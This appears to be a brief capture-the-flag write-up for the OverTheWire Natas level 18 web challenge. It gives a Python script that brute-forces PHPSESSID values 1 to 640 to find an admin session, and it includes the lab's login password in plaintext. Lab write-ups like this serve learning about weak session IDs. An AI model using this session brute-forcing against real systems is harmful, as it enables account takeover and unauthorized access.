![image](https://github.com/user-attachments/assets/7d6faf4a-f9ac-4e91-9925-e4150b27aa9e)

this code doesn't look like a SQLi. it uses PHPSESSID cookie to login.
so we can bruteforce and find the right PHPSESSID that'll let us in.
```
import requests

auth = ('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')  # Replace with your actual password
url = "http://natas18.natas.labs.overthewire.org/"

for sid in range(1, 641):
    cookies = {'PHPSESSID': str(sid)}
    response = requests.get(url, auth=auth, cookies=cookies)

    if "You are an admin" in response.text:
        print(f"[+] Found admin session: {sid}")
        print(response.text)
        break
```
This code will bruteforce and find the right session id. 
![image](https://github.com/user-attachments/assets/6e2b01f5-1bac-4abc-bd93-a04de01d658c)
